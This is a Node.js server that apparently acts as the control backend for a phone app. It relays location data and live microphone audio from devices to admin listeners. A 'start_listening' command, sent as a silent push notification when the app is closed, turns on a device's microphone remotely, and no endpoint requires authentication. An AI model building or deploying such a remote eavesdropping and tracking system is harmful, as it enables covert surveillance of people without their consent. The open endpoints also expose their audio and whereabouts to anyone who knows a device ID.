const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const path = require('path');
const fs = require('fs');
const cors = require('cors');

// APNs for silent push when app is closed (optional: set APNS_KEY, APNS_KEY_ID, APNS_TEAM_ID, APNS_BUNDLE_ID)
let apnsClient = null;
try {
  const key = process.env.APNS_KEY || (process.env.APNS_KEY_PATH && fs.readFileSync(process.env.APNS_KEY_PATH, 'utf8'));
  if (key && process.env.APNS_KEY_ID && process.env.APNS_TEAM_ID && process.env.APNS_BUNDLE_ID) {
    const { ApnsClient } = require('apns2');
    apnsClient = new ApnsClient({
      team: process.env.APNS_TEAM_ID,
      keyId: process.env.APNS_KEY_ID,
      signingKey: Buffer.from(key.replace(/\\n/g, '\n'), 'utf8'),
      defaultTopic: process.env.APNS_BUNDLE_ID,
      host: process.env.APNS_PRODUCTION === 'false' ? 'api.sandbox.push.apple.com' : 'api.push.apple.com',
    });
    console.log('APNs enabled (silent push when device offline)');
  }
} catch (e) {
  console.warn('APNs not configured:', e.message);
}

const app = express();
app.use(cors());
app.use(express.json());

// Serve admin: prefer backend/public (deployed), then ../web-admin (local dev)
const publicPath = path.join(__dirname, 'public');
const legacyAdminPath = path.join(__dirname, '..', 'web-admin');
const adminIndex = fs.existsSync(path.join(publicPath, 'index.html'))
  ? path.join(publicPath, 'index.html')
  : path.join(legacyAdminPath, 'index.html');
if (fs.existsSync(adminIndex)) {
  const adminDir = path.dirname(adminIndex);
  app.use(express.static(adminDir));
  app.get('/', (req, res) => res.sendFile(adminIndex));
} else {
  app.get('/', (req, res) =>
    res.send('<h1>Connection Test Backend</h1><p>API: <a href="/api/health">/api/health</a>. WebSocket at /ws. Use your local admin page and set Backend URL to this domain.</p>')
  );
}

const server = http.createServer(app);

// Store: deviceId -> { ws, lastLocation, streaming, connectedAt }
const devices = new Map();
// Device push tokens (for silent push when app is closed)
const deviceTokens = new Map();
// Admin listeners: deviceId -> Set of admin WebSockets (to stream audio to)
const adminListeners = new Map();

const PORT = process.env.PORT || 4000;
const WS_PATH = '/ws';

const wss = new WebSocketServer({ server, path: WS_PATH });

wss.on('connection', (ws, req) => {
  const url = new URL(req.url || '', `http://${req.headers.host}`);
  const role = url.searchParams.get('role'); // 'device' | 'admin'
  const deviceId = url.searchParams.get('deviceId');

  if (role === 'device' && deviceId) {
    devices.set(deviceId, {
      ws,
      lastLocation: null,
      streaming: false,
      connectedAt: new Date().toISOString(),
    });
    console.log(`Device connected: ${deviceId}`);
    // Keep existing push token when device reconnects
    ws.on('message', (data, isBinary) => {
      if (isBinary) {
        const admins = adminListeners.get(deviceId);
        if (admins) {
          admins.forEach((adminWs) => {
            if (adminWs.readyState === 1) adminWs.send(data);
          });
        }
        return;
      }
      const msg = data.toString();
      if (msg.startsWith('{')) {
        try {
          const obj = JSON.parse(msg);
          if (obj.type === 'location') {
            const d = devices.get(deviceId);
            if (d) d.lastLocation = obj;
          }
          if (obj.type === 'ping') {
            try { ws.send(JSON.stringify({ type: 'pong' })); } catch (_) {}
          }
        } catch (_) {}
      }
    });
    ws.on('close', () => {
      const d = devices.get(deviceId);
      if (d) d.streaming = false;
      devices.delete(deviceId);
      adminListeners.delete(deviceId);
      console.log(`Device disconnected: ${deviceId}`);
    });
    return;
  }

  if (role === 'admin' && deviceId) {
    if (!adminListeners.has(deviceId)) adminListeners.set(deviceId, new Set());
    adminListeners.get(deviceId).add(ws);
    ws.on('close', () => {
      const set = adminListeners.get(deviceId);
      if (set) {
        set.delete(ws);
        if (set.size === 0) adminListeners.delete(deviceId);
      }
    });
    // Tell device to stop streaming when admin disconnects
    ws.on('close', () => {
      const d = devices.get(deviceId);
      if (d && d.ws.readyState === 1) {
        d.ws.send(JSON.stringify({ action: 'stop_listening' }));
        d.streaming = false;
      }
    });
    return;
  }

  ws.close();
});

// REST: register device push token (called by iOS when APNs token is received)
app.post('/api/devices/register', (req, res) => {
  const { deviceId, token } = req.body || {};
  if (!deviceId || !token) return res.status(400).json({ error: 'deviceId and token required' });
  deviceTokens.set(deviceId, token);
  console.log(`Push token registered for device: ${deviceId}`);
  res.json({ ok: true });
});

// REST: list devices (include devices that have token but are offline)
app.get('/api/devices', (req, res) => {
  const list = [];
  const seen = new Set();
  devices.forEach((d, id) => {
    seen.add(id);
    list.push({
      deviceId: id,
      connected: d.ws.readyState === 1,
      streaming: d.streaming,
      lastLocation: d.lastLocation,
      connectedAt: d.connectedAt,
      hasPushToken: deviceTokens.has(id),
    });
  });
  deviceTokens.forEach((_, id) => {
    if (!seen.has(id)) list.push({ deviceId: id, connected: false, hasPushToken: true });
  });
  res.json(list);
});

// REST: send command to device (if offline and start_listening, send silent push)
app.post('/api/devices/:deviceId/command', async (req, res) => {
  const { deviceId } = req.params;
  const { action } = req.body || {};
  const d = devices.get(deviceId);
  if (d && d.ws.readyState === 1) {
    if (action === 'start_listening') d.streaming = true;
    if (action === 'stop_listening') d.streaming = false;
    d.ws.send(JSON.stringify({ action: action || 'ping' }));
    return res.json({ ok: true, action });
  }
  if (action === 'start_listening' && apnsClient) {
    const token = deviceTokens.get(deviceId);
    if (token) {
      try {
        const { Notification } = require('apns2');
        const notif = new Notification(token, {
          aps: { 'content-available': 1 },
          action: 'start_listening',
        });
        await apnsClient.send(notif);
        return res.json({ ok: true, action, pushed: true });
      } catch (err) {
        console.error('APNs send error:', err);
        return res.status(500).json({ error: 'Push failed', detail: err.message });
      }
    }
  }
  res.status(404).json({ error: 'Device not connected and no push token' });
});

// REST: get last known location
app.get('/api/devices/:deviceId/location', (req, res) => {
  const d = devices.get(req.params.deviceId);
  if (!d) return res.status(404).json({ error: 'Device not found' });
  res.json(d.lastLocation || { error: 'No location yet' });
});

// Health
app.get('/api/health', (req, res) => res.json({ ok: true }));

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT}`);
  console.log(`WebSocket: ws://0.0.0.0:${PORT}${WS_PATH}`);
});
